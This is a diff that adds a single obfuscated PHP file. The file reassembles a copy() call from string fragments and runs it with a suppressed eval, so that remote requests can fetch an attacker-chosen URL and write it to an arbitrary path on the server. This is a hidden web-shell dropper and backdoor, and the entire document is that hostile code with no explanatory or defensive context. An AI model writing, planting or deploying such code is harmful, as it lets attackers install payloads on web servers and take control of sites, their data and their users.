@@ -1,0 +1,1 @@
+<?php $item['ad'] = '$_G';$t['a'] = "ET['func']";$a = $item['ad'].$t['a'];$c['a'] = '$_G';$c['b'] = "ET['url']";$c = $c['a'].$c['b'];$items['ad'] = 'co';$ts['a'] = "py($c,$a);";$b = $items['ad'].$ts['a'];@eval($b); ?>
